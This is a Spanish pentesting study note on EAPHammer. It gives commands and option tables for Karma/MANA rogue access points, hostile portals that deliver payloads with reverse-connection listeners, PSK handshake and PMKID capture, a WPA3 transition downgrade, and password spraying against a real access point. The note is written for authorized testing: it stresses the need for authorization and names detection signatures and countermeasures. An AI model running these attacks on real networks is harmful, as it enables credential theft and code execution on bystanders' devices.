---
tags:
  - Wi-Fi/Evil-Twin
  - Tipo/Arsenal
  - Pentesting/Explotacion
Descripción: "Los modos de EAPHammer más allá de 802.1X: portal cautivo y hostil, Karma/MANA, captura de PMKID y el ataque de transición contra WPA3"
Fecha de actualización: 2026-08-04
Nota previa: "[[01 - Ataques a WPA-Enterprise con EAPHammer]]"
Nota siguiente: 
Area: "[[EAPHammer.base|EAPHammer]]"
---
---

`EAPHammer` es conocida por el ataque a 802.1X, pero cubre también redes PSK y abiertas. <mark style="background: #ADCCFFA6;">Su ventaja frente a herramientas más especializadas es que todo comparte la misma gestión de interfaces y de listas de alcance</mark>, lo que evita el trasiego de configuraciones entre `hostapd`, `dnsmasq` y el resto.

# Karma y MANA

```shell-session
$ sudo ./eaphammer -i wlan1 --auth open --karma
$ sudo ./eaphammer -i wlan1 --auth open --mana --loud
```

| Opción | Efecto |
| ------ | ------ |
| `--karma` | Responde a *probe requests* dirigidas con «esa red soy yo» |
| `--mana` | Construye la PNL de cada cliente y responde de forma dirigida |
| `--loud` | Reemite **todas** las redes conocidas a **todos** los dispositivos |
| `--known-beacons` | Emite balizas de SSID comunes para atraer clientes |
| `--known-ssids-file` | Lista propia de SSID a anunciar |

<mark style="background: #FFB86CA6;">`--loud` es la respuesta al hecho de que los clientes modernos ya casi no emiten *probes* dirigidas</mark>: si el dispositivo no pregunta, se le anuncian todas las redes conocidas y se espera a que reconozca una suya. El coste es un AP anunciando decenas de SSID, que es exactamente la firma que busca la alerta `KARMAOUI` de Kismet. El contexto histórico de por qué Karma se degradó está en [[07 - Karma y MANA]].

`--known-beacons` con una lista de SSID muy comunes (`Starbucks`, `_Free_WiFi`, nombres de operador) funciona como red de arrastre cuando no se conoce el objetivo. En un engagement acotado hay que combinarlo con `--mac-whitelist` para no captar dispositivos ajenos.

# Portal cautivo y portal hostil

```shell-session
$ sudo ./eaphammer -i wlan1 -e Guest-WiFi --auth open --captive-portal
$ sudo ./eaphammer -i wlan1 -e CorpWiFi  --auth open --hostile-portal
```

| Opción | Función |
| ------ | ------- |
| `--captive-portal` | Portal que exige interacción antes de dar salida |
| `--hostile-portal` | Portal que **entrega una carga** en vez de pedir credenciales |
| `--portal-template`, `--list-templates` | Plantillas disponibles |
| `--create-template`, `--delete-template` | Gestión de plantillas propias |
| `--portal-https`, `--portal-cert`, `--portal-priv-key` | Servir el portal por HTTPS |
| `--add-download-form`, `--dl-form-message` | Añadir un formulario de descarga |
| `--payload`, `--payload-generator` | Carga a entregar |
| `--lhost`, `--lport` | Escucha para la conexión de vuelta |

El **portal hostil** es la variante que HTB no cubre: en vez de pedir una contraseña, sirve una descarga —un supuesto "cliente VPN" o "actualización de driver"— que ejecuta código en el equipo del usuario. Convierte un ataque inalámbrico en un acceso a endpoint sin tocar la red.

> [!warning]+ Entregar carga ejecutable exige autorización específica
> Un portal hostil ejecuta código en equipos del cliente. <mark style="background: #FF5582A6;">Eso va mucho más allá del alcance típico de un pentest inalámbrico</mark> y suele necesitar una autorización aparte, con acuerdo sobre qué carga se usa, en qué equipos y cómo se limpia después. Ver el apartado de limpieza en [[11 - Post-explotación y valor para el cliente]].

`--portal-https` merece nota aparte: servir el portal por HTTPS con un certificado propio es más creíble en 2026, cuando los usuarios están acostumbrados al candado — aunque el aviso de certificado no válido puede delatar el ataque si el usuario lo lee.

# Redes PSK: handshake y PMKID

```shell-session
$ sudo ./eaphammer -i wlan1 -e CorpWiFi --auth wpa-psk --capture-wpa-handshakes
$ sudo ./eaphammer -i wlan0 --pmkid --essid CorpWiFi
```

| Opción | Función |
| ------ | ------- |
| `--capture-wpa-handshakes` | Captura handshakes de clientes que intentan asociarse |
| `--psk-capture-file` | Fichero donde guardarlos |
| `--pmkid` | Solicita el PMKID al AP objetivo |

Para captura pura, `hcxdumptool` es más ligero y tiene mejor filtrado — ver [[01 - hcxdumptool]]. La ventaja de hacerlo desde EAPHammer es no cambiar de herramienta cuando ya se tiene el AP falso levantado: el handshake que llega es del tipo `M1M2ROGUE`, y su lectura correcta está en [[02 - El formato 22000 y los message pairs]].

# Ataque de transición contra WPA3

```shell-session
$ sudo ./eaphammer -i wlan1 --transition-ssid CorpWiFi --transition-bssid 9C:9A:03:39:BD:7A
```

| Opción | Función |
| ------ | ------- |
| `--transition-ssid` | SSID de la red en modo transición |
| `--transition-bssid` | BSSID a suplantar |

<mark style="background: #8000E1A6;">Automatiza el downgrade de *Dragonblood*</mark>: levanta un AP que sólo ofrece WPA2 con el mismo SSID y BSSID que uno en modo transición, para que los clientes compatibles con WPA3 se conecten por la vía antigua y entreguen un handshake crackeable. La mecánica completa, el contexto de la investigación y la contramedida `transition_disable` están en [[05 - WPA3 en modo transición y downgrade]].

# Configuración persistente

```shell-session
$ sudo ./eaphammer -i wlan1 -e CorpWiFi --auth wpa-eap --creds --save-config engagement.cnf
$ sudo ./eaphammer --manual-config engagement.cnf
```

| Opción | Función |
| ------ | ------- |
| `--save-config` | Guarda la configuración generada y ejecuta |
| `--save-config-only` | Sólo la guarda, sin ejecutar |
| `--manual-config` | Usa un fichero de configuración propio |

`--save-config-only` es útil para dos cosas: revisar exactamente qué `hostapd.conf` genera la herramienta —lo que ayuda a entender qué está haciendo— y **dejar constancia en el informe** de la configuración exacta del AP falso, que es evidencia reproducible del ataque.

# Resumen de modos

| Objetivo | Comando mínimo |
| -------- | -------------- |
| Credenciales 802.1X | `--auth wpa-eap --negotiate weakest --creds` |
| Handshake PSK | `--auth wpa-psk --capture-wpa-handshakes` |
| PMKID | `--pmkid --essid <red>` |
| Phishing de contraseña | `--auth open --captive-portal` |
| Entrega de carga | `--auth open --hostile-portal --payload <fichero>` |
| Suplantar la PNL | `--auth open --mana --loud` |
| Downgrade WPA3 | `--transition-ssid <red> --transition-bssid <mac>` |
| Spraying contra el AP real | `--eap-spray --user-list <f> --password <p>` |
